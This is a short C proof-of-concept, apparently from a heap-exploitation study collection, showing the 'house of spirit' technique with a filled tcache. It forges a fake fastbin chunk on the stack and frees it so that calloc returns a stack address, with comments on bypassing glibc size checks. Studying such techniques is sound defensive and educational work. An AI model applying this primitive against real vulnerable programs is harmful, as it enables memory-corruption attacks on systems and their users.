#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main() {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);

    long *ptr, *chunk;
    long x[0x100], y[7];

    // Fill tcache
    for (int i = 0; i < 7; i++) {
        y[i] = (long)malloc(0x70);
    }
    for (int i = 0; i < 7; i++) {
        free((void *)y[i]);
    }

    // Make sure ptr is aligned 0x10
    for (int i = 0; i < 0x10; i++) {
        if (((long)&x[i] & 0xf) == 0) {
            ptr = &x[i];
            break;
        }
    }

    printf("ptr @ %p\n", ptr);

    ptr[-1] = 0x81; // fake chunk size (fastbin range) (when tcache is fill) (prev_inuse on to prevent error)
    ptr[15] = 0x20; // // fake next adjacent chunk's size (bypass the fencepost size check (>= 0x20), prev_inuse doesnt matter) (15 = 0x70/8 + 0x1)

    /* VULN HERE */
    free(ptr);
    /* VULN HERE */

    chunk = calloc(1, 0x70); // this can be done via malloc but you have to clear the corresponding 0x80 tcache first
    // also you have to prepare foward ptr for fake fastbin chunk, to bypass the tcache dumping process
    // that is harder to set up and since this is just poc, i use calloc to simplize

    printf("chunk @ %p\n", chunk);
    return 0;
}
